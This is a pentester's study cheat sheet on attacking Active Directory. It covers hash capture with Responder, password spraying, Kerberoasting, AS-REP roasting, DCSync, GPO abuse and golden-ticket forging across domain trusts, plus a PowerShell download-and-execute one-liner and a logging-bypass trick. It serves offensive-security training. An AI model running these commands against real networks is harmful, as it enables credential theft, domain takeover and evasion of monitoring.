---
title: Attacking Active Directory
created: 2025-05-29
modified: 2025-05-29
tags: ["AD"]
---
## What is Active Directory?

Active Directory is used for managing users, groups, computers, and servers in a enterprise. Almost all companies nowadays uses Active Directory in some kind of way because it comes with a-lot of features which can help increase productivity and security in the business. Here are some basics overview of the things Active Directory is capable of doing:

* **Onboarding and Offboarding:** Once a account is made for a employee they are able to access the company machine using their credentials. And once the account is disabled the user can no longer access the company machine.
* **Managing Security Group, Users, Computers, and Servers:** It's also possible for us to manage all the users, groups, computers, and servers using Group Policies. An example of Group Policy is only allowing passwords which are 15+ length or more. Another example is to ensure that all servers in our environment to have remote desktop protocol enabled on them.
* **File Share:** We can also setup a file-share so employees can quickly share their files with other employees. It's also possible to use security groups to manage access so only specific users can access specific folders.
* **Least Privilege:** We can also create security groups that enables users inside it to access web applications and other resources to ensure the user only has enough privileges to do their work.

Active Directory comes with many more capabilities which can help the organization manage hundreds of thousands of users, devices, and so forth. It's fairly easy for the system administrator to misconfigure a user, security group, and group policy which can help us with laterally move throughout the network.

> [!Important]
> Active Directory in most organization are setup to only be accessible for users who are inside the network. When a change has been applied the user, computer, server has to be inside the internal network to get the changes that has been happening inside the environment.

## Discovering Hosts

In a internal network there are a-lot of resources such as computers, laptops, and servers that are communicating with the Active Directory. It's possible to obtain quite a-lot of information's from these resources by using the following commands.

```shell title="Discovering Hosts"
# fping: Finding all active hosts in the internal network
fping -asgq 172.16.5.0/23

# Nmap: Scanning all the available hosts
nmap -A -iL '<INPUT-HOST-FILE>' -oN '<OUTPUT-FILENAME>'
```

Nmap scanning through the hosts that are alive will allow us to find services, open ports, and operating system information's which is useful to find misconfigurations, vulnerabilities, or to performing brute-force attacks. 

## Capturing NTLMv2 Hashes

The Link Local Multicast Name Resolution (LLMNR) and NetBIOS are components which searches through the different hosts to find a specific IP-address once the DNS fails. An example of this is when a user tries to find the file-share using `\\husenjan\share` instead of `\\hhesenjan.local\share` the DNS will fail to resolve the IP-address and the LLMNR and NetBIOS will go through the different hosts to find the IP-address. 

The `responder` and `Inveigh.exe` tools enables us to spoof and respond to the LLMNR and NetBIOS traffic as if they have the answer for the requesting host. This will enable us to capture the NTLMv2 hash of the user which mistyped the hostname and then we can start cracking the NTLMv2 hash offline to obtain the password.

```shell title="Linux: Responder"
# Responder: Capturing NTLMv2 Hashes
sudo responder -I '<ETHERNET>'
```

```powershell title="Windows: Inveigh"
# Inveigh: Capturing NTLMv2 hashes (administrator privileges required)
.\Inveigh.exe

# Inveigh PowerShell: Capturing NTLMv2 hashes
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

It's common for users to mistype hostnames therefore it's always recommended to have `responder` or `Inveigh` running in the background while enumerating through other systems and hosts. It's also highly recommended to disable LLMNR and NetBIOS unless the organization uses these services in some form.

## Username Spraying

Username Spraying is a technique that enables us to find usernames of the users inside the Active Directory environment. It's also possible for us to use SMB null sessions and query LDAP anonymously to obtain valid usernames.

```shell title="Username Spraying"
# Obtaining usernames with enum4linx using SMB service with null session
enum4linux -U '<RHOST>'

# Obtaining usernames with RPCClient using SMB service with null session
rpcclient -U '' -N '<RHOST>'
enumdomusers

# Obtaining usernames with LDAPSearch by quering LDAP as anonymous user
ldapsearch -h '<RHOST>' -x -b 'DC=COMPANY,DC=LOCAL' -s sub "(&(objectclass=user))" | grep sAMAccountName | cut -f 2 -d ' '

# Obtaining usernames with crackmapexec by performing a brute-force attack
crackmapexec smb '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>' -users

# Obtaining usernames with kerbrute by performing a brute-force attack
kerbrute userenum -d inlanefreight.htb --dc '<IP>' jsmith.txt`
```

After successfully obtaining usernames that are in use by employees it's possible for us to perform password spray attack. It's important to note that the username are usually formatted with the first character of the first name and the whole last name.

> [!TIP]
> Nowadays all employees shares the places they are working at in LinkedIn and that allows us to collect first name and last name of many employees and then craft a username list using [LinkedIn2Username](https://github.com/initstring/linkedin2username)

## Password Spraying

Password Spraying is a technique that consists of sending a single password to multiple of users. This is especially useful after obtaining usernames from the [[0003 Attacking Active Directory#Username Spraying|Username Spraying]] section as it allows us to spray commonly used passwords against valid usernames.

```shell title="Password Spray Script"
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```shell title="Password Spraying"
# Kerberos: Password Spray
kerbrute passwordspray -d '<DOMAIN-NAME>' --dc '<DC-IP>' '<USERNAME-LIST>' '<PASSWORD>'

# Crackmapexec: Password Spray
crackmapexec smb '<DC-IP>' -u '<USERNAME-LIST>' -p '<PASSWORD>' | grep +

# Crackmapexec: Password Spraying local users
crackmapexec smb '<DC-IP>' --local-auth <IP>/23 -u '<USERNAME>' -H '<HASH>' | grep +
```

It's important to remember that in some environment there are password policies implemented to prevent password spray attacks which could lead to accounts being locked out after multiple of failed login attempts. It's possible for us to obtain these policies by using the following commands.

```shell  title="Password Policy"
# RPCClient: Getting password policy
rpcclient -U '' -N '<RHOST>'
querydominfo

# Enum4Linux: Getting password policy
enum4linux-ng -P '<RHOST>' -oA '<OUTPUT-FILENAME>'

# LDAPSearch: Getting password policy
ldapsearch -h '<RHOST>' -x -b 'DC=<DOMAIN-NAME>,DC=LOCAL' -s sub '*'
ldapsearch -h '<RHOST>' -x -b 'DC=<DOMAIN-NAME>,DC=LOCAL' -s sub '*' | grep -m 1 -B 10 pwdHistoryLength

# PowerView: Getting password policy
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

 The most effective way  to protect the organization from password spray attack is by implementing least privileges, strong password policies, and enforcing multi-factor authentication. If the organization has a-lot of money to spend than it's worth investing in a SIEM system.

## Credentials Enumeration

After successfully obtaining credentials for the Active Directory environment we can further enumerate through the environment to find misconfiguration with system settings, services, users, service accounts, and security groups. Luckily for us there are many tools that assist us with obtaining these information's.

### BloodHound

The most effective way to search for misconfiguration within the Active Directory environment is by using bloodhound as it will help us with visualizing our environment and potentially find misconfiguration with group policies, access control lists, and security groups.

```shell title="Credentials Enumeration"
# Linux: Downloading & Installing Bloodhound
sudo apt-get install bloodhound

# SharpHound: Collecting data for bloodhound
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Bloodhound-Python: Collecting data for bloodhound
bloodhound-python -c all -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns '<IP>'
```

```cypher title='Bloodhound Queries'
// Bloodhound: Finding users with CanPSRemote privileges
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

// Bloodhound: Finding users with SQLAdmin privileges over a host
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

If you are interested in specializing in Active Directory it's critical to understand bloodhound as it comes with capabilities for us to quickly find misconfigurations. It's the Swiss Army knife when it comes to Active Directory and mastering it will save us anywhere from hours to days.

### File Share

The great and bad thing about file share *(SMB service)*  is that the possibility of it containing credentials inside of it is extremely high. A user may have uploaded their credentials there to retrieve it whenever they need it and a system administrator may have uploaded a config file containing their credentials the possibilities are endless.

```shell title="File Share with Crackmapexec"
# Crackmapexec: Enumerating the domain users
crackmapexec smb '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>' --users

# Crackmapexec: Enumerating the domain groups
crackmapexec smb '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>' --groups

# Crackmapexec: Getting all the shares from the SMB services
crackmapexec smb '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>' --shares

# Crackmapexec: Reading through all the files
crackmapexec smb '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus --share '<SHARE-NAME>'
```

```shell title="File Share with SMBMap"
# SMBMap: Getting all the shares
smbmap -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -H '<IP>'

# SMBMAP: Getting all the folders inside the share
smbmap -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -H '<IP>' -R '<SHARENAME>' --dir-only
```

We should always try to skim through all the files which we have access to as that will allow us to potentially find credentials which can elevate our privileges. It could also potentially contain confidential information's such as their finances, employees visas, and much more...

### Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler.git) is a fantastic tool to be familiar with as it will automatically enumerate through all the computers from Active Directory and figure out which one has file shares and then start reading all the files which it has read access on.

```powershell title="Snaffler"
# Snaffler: Inspecting misconfigured permissions from fileshares
.\Snaffler.exe -d "<DOMAIN>" -s -v data -o "snaffler.log"
```

I highly recommend becoming familiar with [Snaffler](https://github.com/SnaffCon/Snaffler.git) as the capabilities it comes with is extremely useful in large environment which has multiple of servers running SMB services that is why I choose to give the tool itself it's own section.

### PowerView

[PowerView](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1) is a extremely powerful PowerShell script that comes with many capabilities such as querying data from domain controller, managing users, managing groups, and Kerberoasting users. It's nearly impossible to cover everything that is possible with Powerview but I'll try to cover as much as possible.

```shell title="Powerview"
# PowerView: Importing Module
Import-Module .\PowerView.ps1

# PowerView: Viewing resursive group memberships
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# PowerView: Viewing Domain Trust Relationships
Get-DomainTrustMapping

# PowerView: Testing for Local Admin Access
Test-AdminAccess -ComputerName "<COMPUTER-NAME>"

# PowerView: Getting all SPN accounts
Get-DomainUser * -SPN | Select SamAccountName

# PowerView: Getting a TGS Ticket in hashcat format
Get-DomainUser -Identity '<USERNAME>' |  Get-DomainSPNTicket -Format Hashcat

# PowerView: Exporting TGS Ticket
Get-DomainUser -Identity '<USERNAME>' | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\TGSTicket.csv -NoTypeInformation

# PowerShell: Creating a PSCredential object
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\<USERNAME>', $SecPassword)

# PowerView: Getting all ACLs from Active Directory
Find-InterestingDomainACL

# ActiveDirectory: Finding all ACLs
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# PowerShell: Getting all users inside the group
Get-ADGroup -Identity '<GROUP-NAME>' -Properties  * | Select -ExpandProperty Members
Get-DomainGroupMember -Identity '<GROUP-NAME>' | Select MemberName

# PowerView: Adding a user into the group
Add-DomainGroupMember -Identity '<GROUP-NAME>' -Members '<USER>' -Credential $Cred -Verbose

# PowerView: Removing a user from the group
Remove-DomainGroupMember -Identity '<GROUP-NAME>' -Members '<USER>' -Credential $Cred -Verbose

# PowerView: Adding values to Service Principal Name attribute on a domain account 
Set-DomainObject -Credential $Cred -Identity '<TARGET>' -SET @{ServicePrincipalName='<DOMAIN>/<NAME>'} - Verbose

# PowerView: Removing the values inside Service Principal Name attribute
Set-DomainObject -Credential $Cred -Identity '<TARGET>' -Clear ServicePrincipalName -Verbose

# PowerView: Finding accounts with reversible encryption enabled
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol

# PowerView: Finding all users who has RDP access to a specific machine
Get-NetLocalGroupMember -ComputerName '<COMPUTER-NAME>' -GroupName 'Remote Desktop Users'

# PowerView: Finding all users who has CanPSRemote access on a specific machine
Get-NetLocalGroup -ComputerName '<COMPUTER-NAME>' -GroupName 'Remote Management Users' 

# PowerView: Getting all users description to potentially find credentials
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

# PowerView: Getting all the accounts with `Do not require Kerberos Pre-Authentication` settings enabled as that will allow us to do ASREPRoasting
Get-DomainUser -PreauthNotRequired | Select SamAccountName,UserPrincipalName,UserAccountControl | fl
```

It will be impossible to remember all these commands therefore I highly recommend taking notes of them incase you need it in the near future. In my eyes the PowerView is a Swiss Army knife when it comes to Active Directory environment.

### Kerberoasting

Kerberos is the primary authentication protocol in Active Directory. The way the authentication system functions is the client sends a request with the username and password to the Key Distribution Center (KDC) and the server decrypts the request using user password hash from the Active Directory and sends back a TGT ticket where session can be decrypted using the user password hash.

However, Kerberos authentication protocol has a flaw with Service Principal Names (SPN) because all domain users can request a TGS ticket from the KDC. The TGS ticket is encrypted with the SPN password which can be decrypted offline. All a threat actor needs to accomplish Kerberoasting is valid credentials within our system and there are multiple of ways to do Kerberoasting attack.

```shell title="Kerberoasting from Linux"
# Impacket: Getting all SPN accounts that can be kerberoasted
impacket-GetUserSPNs.py -dc-ip '<IP>' '<DOMAIN>/<USERNAME>'

# Impacket: Getting all SPN accounts hashes
impacket-GetUserSPNS  -dc-ip '<IP>' '<DOMAIN>/<USERNAME>' -request -output '<FILENAME>'

# Hashcat: Cracking TGS Ticket
hashcat -m 13100 '<TGS-TICKET-HASH>' /usr/share/wordlists/rockyou.txt
```

```powershell title='Kerberosting from Windows'
# PowerView: Importing Module
Import-Module .\PowerView.ps1

# PowerView: Getting all SPN accounts
Get-DomainUser * -SPN | Select SamAccountName

# PowerView: Getting a TGS Ticket in hashcat format
Get-DomainUser -Identity '<USERNAME>' |  Get-DomainSPNTicket -Format Hashcat

# PowerView: Exporting TGS Ticket
Get-DomainUser -Identity '<USERNAME>' | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\TGSTicket.csv -NoTypeInformation
```

```powershell title='Kerberoasting with Rubeus'
# Rubeus: Getting Information of Active Diretory
.\Rubeus.exe kerberoast /stats

# Rubeus: Exporting TGS Ticket from a privileged user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Rubeus: Exporting TGS Ticket from a specific user
.\Rubeus.exe kerberoast /user:'<USERNAME>' /nowrap

# PowerView: Getting Information About Encryption Method (RC4: Weak, AES: Strong)
Get-DomainUser '<USERNAME>' -Properties SAMAccount,ServicePrincipalName,MSDS-SupportedEncryptionTypes

# Rubeus: Exporting TGS Ticket with rc4 encryption
.\Rubeus.exe kerberoast /tgtdeleg /user:'<SPN>' /nowrap
```

The likelihood of  Service Principal Name (SPN) having weak credentials is medium because the system administrator could had setup the service principal name account with weak credentials for testing a service and once it was deployed to production he forgot to change it to something more complex.

### AS-REP Roasting

AS-REP Roasting is a technique that enables us to obtain Ticket Granting Ticket (TGT) for any domain account that has `Kerberos Pre-Authentication` settings enabled on them. The reason some domain users has that option enabled is because the vendor of a application may require service principal name to be configured that way.

```powershell title='ASREPRoasting'
# PowerView: Getting all accounts with `Do not require Kerberos Pre-Authentication` settings enabled
Get-DomainUser -PreauthNotRequired | Select SamAccountName,UserPrincipalName,UserAccountControl | fl

# PowerView: Performing AS-REP Roasting on a account
.\Rubeus.exe asreproast /user:'<USERNAME>' /nowrap /format:hashcat

# Kerbrute: Performing AS-REP Roasting on a account
kerbrute userenum -d 'hhesenjan.local' --dc '<DC-IP>' /opt/jsmith.txt

# Impacket: Performing AS-REP Roasting on a account
impacket-GetNPUsers 'hhesenjan.local' -dc-ip '<DC-IP>' -no-pass -usersfile 'valid_ad_users'

# Hascat: Cracking the password offline
hashcat -m 18200 '<OUTPUT_FILENAME>'  '/usr/share/wordlists/rockyou.txt'
```

When a user has `GenericWrite` or `GenericAll` over a domain account they can enable `Kerberos Pre-Authentication` settings on the domain account and obtain the TGT ticket to crack the password offline. Once they obtain the TGT ticket they can disable the settings as nothing ever happened with tat account.

### DCSync

DCSync is a technique that consists of stealing the Active Directory Password Database *(NTDS.dit)* by using the Replication Service Remote Protocol which is commonly used by domain controllers to replicate data between other domain controllers. If a user is misconfigured with the permission `DS-Replication-Get-Changes-All` that will allow them to replicate the database. The two tools that comes with the capabilities to perform DCSync attack is `secretsdump` and `mimikatz`.

```powershell title='DCSync with SecretsDump'
# PowerView: Checking for DCsync privileges
$SID = Convert-NameToSid '<USERNAME>'
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

# PowerView: Finding accounts with reversible encryption enabled
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol

# PowerView: Performing DCSync attack
impacket-secretsdump -outputfile '<OUTPUT-FILENAME>' -just-dc '<DOMAIN>/<USERNAME>@<IP>'
```

```powershell title='DCSYNC with Mimikatz'
# Mimikatz: Starting a shell with user that has DS-Replication-Get-Changes-All permissions
runas /netonly /user:'<DOMAIN>\<USERNAME>' powershell

# Mimikatz: Enabling privileged debugging
privilege::debug

# Mimikatz: Performing DCSync attack
lsadump::dcsync /domain:<DOMAIN-NAME> /user:<DOMAIN>\administrator
```

The easiest and quickest way to find users who are misconfigured with the `DS-Replication-Get-Changes-All` is using [[0003 Attacking Active Directory#BloodHound|BloodHound]] as it will visualize all the users who are misconfigured with that permission. Another thing that is important to note is that some passwords inside the Active Directory will be shown in plaintext while doing DCSync attack and that happens because the `Reversible Encryption` is enabled on the account.

### Group Policy Object Abuse

Group Policy Object provides the system administrators to apply policies to users, computers, and server objects inside the Active Directory. It's great for applying policies such as password strength requirements, idle timeout for users, and always allowing remote desktop access to domain administrators.

```powershell title='Group Policy Object (GPO) Abuse'
# PowerView: Importing Module
Import-Module .\PowerView.ps1

# PowerView: Getting GPO by their name
Get-DomainGPO | Select DisplayName

# Group Policy Management Tools: Getting GPO by their name
Get-GPO -All | Select DisplayName

# PowerView: Enumerating Domain User GPO Rights
$SID = Convert-NameToSID "Domain Users"
Get-DomainGPO | Get-ObjectACL | ?{$_.SecurityIdentifier -eq $SID}

# Group Policy Management Tools: Converting GPO to Name
Get-GPO -Guid "7CA9C789-14CE-46E3-A722-83F4097AF532"

# SharpGPOAbuse: Adding a account to local administrator group
	SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<USERNAME>' --GPOName "Vulnerable GPO"
```

Users inside the organization may be able to modify a group policy since the permissions were misconfigured while setting up the group policy object. The [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) is great for abusing these misconfiguration but it's important to note that it could affect anywhere from 10s to 100s of computers inside the active directory which could significantly affect the organization.

### Domain Trust

When a organization acquires another company they will need to create a domain trust relationship between the domain controllers for them to communicate with each other. This communication can be one-way or two-way (bidirectional) communication. 

* **One-way Trust Relationship:** Users from Domain A can access resources in Domain B. However, users in Domain B can’t access resources in Domain A.
* **Two-way Trust Relationship:** Users from Domain A can access resources in Domain B. The Domain B can also access the resources in Domain A.

The organization Domain A could be extremely secure but if there are misconfiguration in Domain B the threat actors could use these misconfigurations to obtain domain privileges over Domain A. This is possible because of the two-way trust relationships between the domain controllers.

```powershell title="Domain Trust: ActiveDirectory Module"
# ActiveDirectory: Importing Module
Import-Module .\ActiveDirectory.ps1

# ActiveDirectory: Viewing Domain Trust Relationships
Get-ADTrust -Filter *
```

```powershell title="Domain Trust: PowerView Module"
# PowerView: Importing Module
Import-Module .\PowerView.ps1

# PowerView: Viewing Domain Trust Relationships
Get-DomainTrust

# PowerView: Viewing Domain Trust Mapping Information
Get-DomainTrustMapping

# PowerView: Checking Users in Child Domain
Get-DomainUser - Domain 'LOGISTICS.HHESENJAN.LOCAL' | Select SamAccountName
```

```powershell title="Domain Trust: CMD"
# CMD: Viewing Domain Trust Relationships
netdom query /domain:'hhesenjan.local' trust

# CMD: Viewing all domain controllers
netdom query /domain:'hhesenjan.local' dc

# CMD: Viewing all workstations and servers
netdom query /domain:'hhesenjan.local' workstation
```

These commands allows us to obtain information's about the domain trust relationships the organization has in their environment. If we have successfully compromised the child domain it's possible for us to use [SIDHistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) to set a non-existent account to the SID of Enterprise Admin Group and then we can generate a Golden Ticket which allows us to access everything in a parent domain.


```powershell title='SIDHistory On Windows: Mimikatz & PowerView'
# PowerView: Importing Module
Import Module .\PowerView.ps1

# Mimikatz: Starting Mimikatz
.\mimikatz.exe

# Mimikatz: Enabling Debug Privileges
privilege::debug

# Mimikatz: Performing DCSync Attack on Child Domain
lsadump::dcsync /user:LOGISTICS\KRBTGT

# PowerView: Getting Domain SID
Get-DomainSID 

# PowerView: Getting SID of Enterprise Admins Group
Get-DomainGroup -Domain 'hhesenjan.local' -Identity "Enterprise Admins" | Select distinguishedname, objectsid

# Mimikatz: Creating golden ticket
kerberos::golden /user:'hhesenjan-admin' /domain:'logistics.hhesenjan.local' /sid:'<DOMAIN-SID>' /krbtgt:'<KRBTGT-NTLM-HASH>' /sids:'<ENTERPRISE-ADMIN-GROUP-SID>' /ptt

# Klist: Viewing the golden ticket
klist
```

```powershell title='SIDHistory On Windows: Rubeus'
# Rubeus: Creating golden ticket
.\Rubeus.exe golden /rc4:'<KRBTGT-NTLM>' /domain:'logistics.hhesenjan.local' /sid:'<DOMAIN-SID>' /sids:'<ENTERPRISE-ADMIN-GROUP-SID>' /user:'hhesenjan-admin' /ptt

# Klist: Viewing the golden ticket
klist

# Mimikatz: Performing DCSync Attack on primary domain controller
lsadump::dcsync /user:HHESENJAN\lab_admin /domain:hhesenjan.local
```

```shell title='SIDHistory on Linux'
# Impacket: DCSync with secretsdump.py
impacket-secretsdump 'logistics.hhesenjan.local/<USERNAME>'@'<CHILD-DC-IP>' -just-dc-user LOGISTICS/krbtgt

# Impacket: Finding Child Domain SID
impacket-lookupsid 'logistics.hhesenjan.local/<USERNAME>'@'<CHILD-DC-IP>'| grep "Domain SID"

# Impacket: Finding Enterprise Admins Group SID
impacket-lookupsid 'logistics.hhesenjan.local/<USERNAME>'@'<CHILD-DC-IP>' | grep -B12 "Enterprise Admins"

# Impacket: Generating Golden Ticket
impacket-ticketer -nthash '<NTLM>' -domain 'logisitcs.hhesenjan.local' -domain-sid '<CHILD-DOMAIN-SID>' -extra-sid '<ENTERPRISE-ADMIN-SID>' '<AccountName>'

# Klist: To use Golden Ticket
export KRB5CCNAME='<NAME>.ccache'

# Impacket: Accessing primary domain as enterprise admin
impacket-psexec 'logistics.hhesenjan.local/hhesenjan-pwnd'@'<PRIMARY-DOMAIN-CONTROLLER>' -k -no-pass -target-ip '<PRIMARY-DOMAIN-IP>'
```

```shell title='Automated SIDHistory Attack'
# raiseChild: Performing SIDHistory Attack
raiseChild.py -target-exec '<PRIMARY-DOMAIN-CONTROLLER>' '<CDHILD-DOMAIN>'/'<USERNAME>'
```

[SIDHistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) is a technique which will only succeed if the child domain has a two-way trust relationship with the domain controller. The only way for the system administrator to revoke our Golden Ticket is by resetting the `KRBTGT` account password. 

## Living Off The Land

The **Living Off The Land** is a concept where we only use tools which comes with the machine to elevate our privileges or lateral move through the network. It's possible because the Windows machines comes with a-lot of different tools which are great for enumerating the system.

```powershell title="Living Off The Land"
# CMD: Getting Hostname
hostname

# CMD: Getting Username
whoami

# CMD: Getting a list of all logged on users
qwinsta

# CMD: Getting Domain Name of Host
echo %USERDOMAIN%

# CMD: Getting Domain Controller Information
echo %logonserver%

# CMD: Getting latest patches and hotfixes applied to the host
wmic qfe get Caption,Description,HotFixID,InstalledOn

# CMD: Getting all network information
ipconfig /all

# CMD: Getting ARP Table
arp -a

# CMD: Getting Route Table for IPv4 and IPv6
route print

# CMD: Getting all environment variables
set

# CMD: Getting system informations
systeminfo

# CMD: Getting firewall informations
netsh advfirewall show allprofiles

# CMD: Querying information from Windows Defender
sc query windefend

# PowerShell: Bypassing Event Viewer Logging
powershell.exe -version 2

# PowerShell: Getting Windows operating system version
[System.Environment]::OSVersion

# PowerShell: Getting the PowerShell console history
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# PowerShell: Getting the list of PowerShell modules
Get-Module

# PowerShell: Getting the list of execution policies
Get-ExecutionPolicy -List

# PowerShell: Starting a terminal to do temporarily changes
Set-ExecutionPolicy Bypass -Scope process

# PowerShell: Quickly download files
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('<URL>');"

# PowerShell: Querying information about Windows Defender
Get-MpComputerStatus
```

```powershell title="Windows Managemnet Instrumentation"
# Prints the patch level and description of the Hotfixes applied
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Displays basic host information to include any attributes within the list
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# A listing of all processes on host
wmic process list /format:list

# Displays information about the Domain and Domain Controllers
wmic ntdomain list /format:list

# Displays information about all local accounts and any domain accounts that have logged into the device
wmic useraccount list /format:list

# Information about all local groups
wmic group list /format:list

# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list
```

We should always try to manually enumerate through the Windows system before transferring our tools into the Windows system as it will help us with avoiding detection from EDR solution running on the machine and we might be able to find misconfiguration that a automated tool cannot find.